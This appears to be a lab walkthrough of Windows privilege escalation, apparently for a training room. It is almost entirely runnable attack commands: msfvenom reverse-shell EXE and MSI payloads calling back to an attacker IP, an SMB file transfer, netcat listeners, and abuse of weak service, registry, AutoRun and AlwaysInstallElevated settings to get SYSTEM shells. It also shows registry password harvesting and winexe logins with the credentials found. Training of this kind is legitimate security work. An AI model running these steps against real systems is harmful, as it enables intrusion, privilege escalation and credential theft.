# Windows Privesc

### Connecting with RDP Port 3389

```text
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.34.38
```

### Making SMB Server to send Rev-shell

Generate a reverse shell executable \(reverse.exe\) using msfvenom.

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as reverse.exe:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

On Windows \(update the IP address with your Kali IP\):

`copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`

Test the reverse shell by setting up a netcat listener on Kali:

`sudo nc -nvlp 53`

Then run the reverse.exe executable on Windows and catch the shell:

`C:\PrivEsc\reverse.exe`

![](.gitbook/assets/image%20%2840%29.png)

### Service Exploits - Insecure Service Permissions

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`

![](.gitbook/assets/image%20%2841%29.png)

Note that the "user" account has the permission to change the service config \(SERVICE\_CHANGE\_CONFIG\).

Query the service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\):

`sc qc daclsvc`

![](.gitbook/assets/image%20%2842%29.png)

Modify the service config and set the BINARY\_PATH\_NAME \(binpath\) to the reverse.exe executable you created:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`

### Service Exploits - Unquoted Service Path

Query the "unquotedsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start unquotedsvc`

### Service Exploits - Weak Registry Permissions

Query the "regsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\).

`sc qc regsvc`

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group \(essentially all logged-on users\):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start regsvc`

### Service Exploits - Insecure Service Executables

Query the "filepermsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\).

`sc qc filepermsvc`

Using accesschk.exe, note that the service binary \(BINARY\_PATH\_NAME\) file is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start filepermsvc`

### Registry - AutoRuns

Query the registry for AutoRun executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin \(admin/password123\) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!  
`rdesktop 10.10.64.1`

### Registry - AlwaysInstallElevated

Query the registry for AlwaysInstallElevated keys:

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

Note that both keys are set to 1 \(0x1\).

On Kali, generate a reverse shell Windows Installer \(reverse.msi\) using msfvenom. Update the LHOST IP address accordingly:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows \(use the SMB server method from earlier\).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

### Passwords - Registry

\(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123\)

The registry can be searched for keys and values that contain the word "password":

`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges \(update the password with the one you found\):

`winexe -U 'admin%password' //10.10.107.212 cmd.exe`

\`\`

